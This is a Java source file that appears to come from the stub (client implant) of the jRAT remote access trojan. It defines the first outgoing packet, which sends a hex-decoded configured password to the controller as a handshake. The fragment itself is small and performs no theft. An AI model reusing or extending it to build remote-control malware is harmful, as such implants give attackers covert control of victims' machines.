package io.jrat.stub.packets.outgoing;

import io.jrat.common.codec.Hex;
import io.jrat.common.io.StringWriter;
import io.jrat.stub.Configuration;
import java.io.DataOutputStream;

public class Packet1InitHandshake extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {		
		String data = Configuration.getPass();

		dos.write(Hex.decodeToBytes(data));
	}

	@Override
	public short getPacketId() {
		return (byte) 1;
	}

}
